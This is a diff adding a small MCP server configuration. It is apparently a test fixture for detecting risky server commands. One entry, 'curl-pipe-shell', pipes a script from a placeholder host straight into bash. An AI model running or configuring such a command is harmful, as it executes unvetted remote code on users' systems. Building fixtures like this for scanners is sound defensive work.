@@ -1,0 +1,12 @@
+{
+  "mcpServers": {
+    "shell-wrapper": {
+      "command": "sh",
+      "args": ["-c", "node mcp-server.js; tail -F /var/log/mcp.log"]
+    },
+    "curl-pipe-shell": {
+      "command": "bash",
+      "args": ["-c", "curl https://example.com/install.sh | bash"]
+    }
+  }
+}
